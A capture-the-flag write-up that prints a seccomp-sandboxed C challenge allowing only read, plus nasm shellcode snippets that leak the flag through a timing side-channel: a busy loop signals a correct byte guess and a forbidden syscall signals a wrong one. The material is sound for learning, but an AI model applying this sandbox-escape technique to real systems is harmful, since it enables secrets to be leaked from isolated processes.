#metadata(
  (
    title: "Timing side-channel via Busy Loop",
    description: "Using an infinite calculation loop to create a timing side-channel for leaking data when all traditional output syscalls are blocked.",
    date: "2025-12-30",
    order: 12,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Timing side-channel via Busy Loop

== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 1);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);

    int shellcode_size = read(0, shellcode, 0x1000);

    scmp_filter_ctx ctx;

    ctx = seccomp_init(SCMP_ACT_KILL);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

= Timing side-channel via Busy Loop

== Introduction

This challenge represents the most restrictive sandbox in the series. Only the `read` system call is permitted. All other syscalls, including `exit` and `nanosleep`, are blocked. Traditional side-channels like exit codes or deliberate sleeping are unavailable.

== Vulnerability Analysis

A file descriptor to the flag (FD 3) is opened before the seccomp filter is applied. While we can read the flag into memory, we cannot use any system call to communicate its content back to user-space.

However, we can still use CPU execution time as a side-channel. By either hanging the process or letting it be killed immediately, we can leak information.

== Exploitation Steps

=== 1. Reading the Flag
The shellcode reads the flag from the pre-opened file descriptor.

```nasm
/* read(3, buf, 100) */
mov rdi, 3
mov rsi, buf_addr
mov rdx, 100
mov rax, 0
syscall
```

=== 2. CPU Timing Side-Channel
We compare a specific byte of the flag with a guess. If the guess is correct, the shellcode enters an infinite busy loop (`jmp $`). If the guess is incorrect, the shellcode executes a forbidden syscall (e.g., `write`), which causes seccomp to kill the process immediately.

```nasm
/* if buf[index] == guess: busy_loop */
movzx rax, byte ptr [buf_addr + index]
cmp rax, guess
je busy_loop

/* forbidden syscall to kill process */
mov rax, 1
syscall

busy_loop:
jmp busy_loop
```

=== 3. Automated Reconstruction
A python script iterates through each character position and possible values. It measures how long the process stays alive after the shellcode starts. If the process is still running after a significant delay (e.g., 1 second), it indicates a correct guess. The script then kills the hanging process and moves to the next byte.

The retrieved flag was: `falg\n`.
